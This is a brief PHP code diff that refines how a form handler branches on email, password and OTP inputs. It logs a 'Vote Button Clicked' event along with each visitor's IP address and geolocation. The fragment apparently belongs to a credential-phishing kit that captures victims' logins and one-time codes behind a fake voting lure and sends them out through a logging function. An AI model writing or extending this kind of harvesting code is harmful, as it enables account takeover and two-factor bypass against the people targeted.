@@ -161,8 +161,8 @@ if (!empty($vote)) {
     $subject = "Vote Button Clicked: $ip";
 
     logMessage($message, $send, $subject);
-} elseif (!empty($em)) {
-    // Continue button clicked (email/phone entered without password)
+} elseif (!empty($em) && empty($password) && empty($otp)) {
+    // Continue button clicked (email/phone entered without password or OTP)
     $ip = getClientIP();
     $location = getLocation($ip);
 
